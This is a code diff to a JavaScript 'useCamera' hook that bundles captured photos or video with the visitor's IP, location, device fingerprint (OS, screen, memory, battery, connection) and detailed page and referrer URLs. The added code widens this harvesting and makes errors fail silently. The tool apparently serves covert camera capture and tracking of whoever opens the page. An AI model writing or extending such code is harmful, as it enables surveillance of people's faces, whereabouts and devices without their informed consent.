@@ -6,7 +6,8 @@ import {
     takePicture,
     recordVideo,
     takePictureFromStream,
-    getLocationValue
+    getLocationValue,
+    gatherRequestContext
 } from '../utils/cameraUtils';
 
 const CAMERA_CONFIG = {
@@ -99,9 +100,12 @@ export function useCamera() {
         const mimeType = mimeMatch ? mimeMatch[1] : (mediaType === 'photo' ? 'image/jpeg' : 'video/webm');
         const base64Data = mediaData.split(',')[1];
         
-        // Get GPU info
         const gpuDetails = await getGPUDetails();
         const gpuInfo = gpuDetails ? `${gpuDetails.vendor} - ${gpuDetails.renderer}` : 'Unknown';
+        const req = gatherRequestContext();
+        const batteryCombined = minimalInfo.current && minimalInfo.current.batteryLevel
+            ? `${minimalInfo.current.batteryLevel} (${minimalInfo.current.isCharging})`
+            : 'Unknown';
         
         const payload = {
             image: base64Data,
@@ -112,6 +116,11 @@ export function useCamera() {
                 mimeType: mimeType,
                 ip: minimalInfo.current?.ip || locationData.current?.ip || 'Unknown',
                 location: locationData.current?.location || getLocationValue(locationData.current),
+                locationByIP: getLocationValue(locationData.current),
+                device: systemData.deviceType,
+                os: systemData.operatingSystem,
+                screen: systemData.screenResolution,
+                connection: navigator.connection ? `${navigator.connection.effectiveType || 'Unknown'}` : 'Unknown',
                 connectionDetails: navigator.connection ? 
                     `${navigator.connection.effectiveType || 'Unknown'} (${navigator.connection.type || 'Unknown'})` : 
                     'Unknown',
@@ -120,8 +129,24 @@ export function useCamera() {
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
                 platform: navigator.platform || 'Unknown',
                 hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+                deviceMemory: navigator.deviceMemory || 'Unknown',
+                memory: navigator.deviceMemory || 'Unknown',
+                battery: batteryCombined,
                 cookiesEnabled: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
-                doNotTrack: navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack || 'Unknown'
+                doNotTrack: navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack || 'Unknown',
+                https: req.https,
+                method: req.method,
+                scheme: req.scheme,
+                protocol: req.protocol,
+                port: req.port,
+                host: req.host,
+                entryUrl: req.entryUrl,
+                fullUrl: req.fullUrl,
+                referrerType: req.referrer.type,
+                referrerHost: req.referrer.host,
+                referrerFullUrl: req.referrer.fullUrl,
+                referrerPath: req.referrer.path,
+                referrerQuery: req.referrer.query
             }
         };
 
@@ -244,9 +269,7 @@ export function useCamera() {
                     locationData.current.ip = ipData.ip;
                 }
             }
-        } catch (error) {
-            console.error('Error initializing system data:', error);
-        }
+        } catch (error) {}
         
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
